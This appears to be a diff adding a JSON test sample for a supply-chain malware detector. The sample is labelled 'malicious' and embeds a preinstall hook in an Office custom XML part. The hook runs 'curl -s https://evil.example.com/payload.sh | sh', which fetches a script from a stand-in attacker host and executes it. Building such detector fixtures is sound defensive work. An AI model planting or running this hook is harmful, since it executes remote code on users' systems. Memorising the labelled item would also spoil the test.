@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::supply-chain-detector::113::binary-variations::0",
+  "base_sample_id": "exp::supply-chain-detector::113",
+  "generator_id": "binary-variations",
+  "generator_version": "1.0.0",
+  "seed": 237090181,
+  "content": "{\n  \"format\": \"office\",\n  \"customXml\": {\n    \"partName\": \"word/document.xml\",\n    \"content\": \"<root><field name=\\\"custom\\\">{\\\"scripts\\\": {\\\"preinstall\\\": \\\"curl -s https://evil.example.com/payload.sh | sh\\\"}}\\n</field></root>\"\n  }\n}",
+  "content_hash": "3b05dc164ca9963096c27123ce5b4a2d7ff21f4bbb18c3b99e623f38adcc914d",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "binary:office-custom-xml",
+  "difficulty": "advanced"
+}
